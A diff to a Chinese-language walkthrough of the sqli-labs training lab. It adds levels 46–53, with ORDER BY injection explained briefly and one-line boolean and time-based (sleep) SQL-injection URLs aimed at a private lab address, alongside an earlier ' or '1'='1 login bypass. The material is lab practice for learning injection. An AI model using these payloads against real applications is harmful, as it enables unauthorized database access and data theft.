@@ -7,7 +7,7 @@
 2. `and if(1=1,1,1)=1`
     > 正常执行的话，等于1正常返回，其他数值报错。这是一个类似三元运算符的东西。算式成立返回第一个值，否则返回第二个值
 3. `if(1=(select 1 REGEXP if(1=1,1,0x00)),1,1)=1`
-    > REGEXP 是模糊查询。这样执行`select 2 REGEXP 2;`,会返回
+    > REGEXP 是模糊查询。这样执行`select 2 REGEXP 2;`,会返回1，匹配不到会返回0
 4. `left(user(),1)="r"`
     > 查询用户名的第一个字母
 
@@ -362,6 +362,43 @@ IFNULL(1/(locate(right(left(lower(user()),1),1),'r')),' yes’)
 ## 第四十五关
 
 1. `login_user=admin&login_password=123456' or '1'='1&mysubmit=Login`
+
+## 第四十六关
+
+这关考察的是order by处的注入。
+
+- 利用`rand()`函数,`?sort=rand(sql 语句)`, rand(ture)和 rand(false)的结果是不一样的。
+- 利用 and，例如?sort=1 and (加 sql 语句)。
+
+1. 注入语句 `http://192.168.3.148/Less-46/?sort=rand(if(1=1,1,1)=1)`
+
+## 第四十七关
+
+1. 延时吧 `http://192.168.3.148/Less-47/?sort=1' and sleep(1) --+`
+
+## 第四十八关
+
+1. 延时 `http://192.168.3.148/Less-48/?sort=1 and sleep(1)`
+
+## 第四十九关
+
+1. 和上关注入语句相同 `http://192.168.3.148/Less-49/?sort=1' and rand(if(1=1,1,1)=1) --+`
+
+## 第五十关
+
+1. 注入语句 `http://192.168.3.148/Less-50/?sort=1 and sleep(1)`
+
+## 第五十一关
+
+1. 注入语句 `http://192.168.3.148/Less-51/?sort=1' and sleep(1) --+`
+
+## 第五十二关
+
+1. 注入语句 `http://192.168.3.148/Less-52/?sort=1 and sleep(1)`
+
+## 第五十三关
+
+1. 注入语句 `http://192.168.3.148/Less-53/?sort=1' and sleep(1) --+`
 
 ## 感谢以下博文的原作者
 
